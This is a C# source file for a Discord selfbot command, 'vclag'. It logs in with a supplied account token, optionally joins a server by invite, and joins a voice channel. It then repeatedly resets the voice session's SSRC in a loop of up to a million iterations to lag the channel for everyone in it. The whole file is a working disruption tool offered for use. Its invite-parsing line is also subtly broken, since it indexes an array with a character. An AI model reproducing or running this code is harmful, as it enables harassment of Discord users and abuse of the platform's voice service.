using Discord;
using Discord.Commands;
using Discord.Gateway;
using Discord.Media;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Zex_selfbot.Commands
{
    [Command("vclag", "lags vc")]
    public class VcLagCommand : CommandBase
    {
        [Parameter("token")]
        public string Token { get; private set; }

        [Parameter("channel id")]
        public string VcId { get; private set; }

        [Parameter("invite")]
        public string Invite { get; private set; }
        public override void Execute()
        {
            if (Message.Author.User.Id != Program.userID) return;
            Message.Delete();
            List<Thread> startedThreads = new List<Thread>();
            Thread myThread = new Thread(() => Start());
            myThread.Start();
            startedThreads.Add(myThread);
            myThread.Join();
        }
        public void Start()
        {
            DiscordSocketClient client = new DiscordSocketClient();
            client.OnLoggedIn += Client_OnLoggedIn;
            client.Login(Token);
            if (Invite != null)
            {
                try
                {
                    client.JoinGuild(Invite.Split('/')[Invite.Last()]);
                }
                catch (IndexOutOfRangeException)
                {
                    client.JoinGuild(Invite);
                }
            }
            Thread.Sleep(-1);
        }

        private void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            var session = client.JoinVoiceChannel(new VoiceStateProperties() { ChannelId = ulong.Parse(VcId) });
            session.ReceivePackets = false;
            session.OnConnected += Session_OnConnected;
            session.Connect();
        }

        private static void Session_OnConnected(DiscordVoiceSession session, EventArgs e)
        {
            Console.WriteLine("Connected to voice channel");

            try
            {
                while (session.State == MediaSessionState.Authenticated)
                {
                    for (uint i = 1; i < 1000000; i++)
                        session.SetSSRC(i);
                }
            }
            catch (InvalidOperationException) { }
        }

        public override void HandleError(string parameterName, string providedValue, Exception exception)
        {
            Message.Delete();                
            Message.Channel.SendMessage("Invalid value on " + parameterName);

        }
    }
}
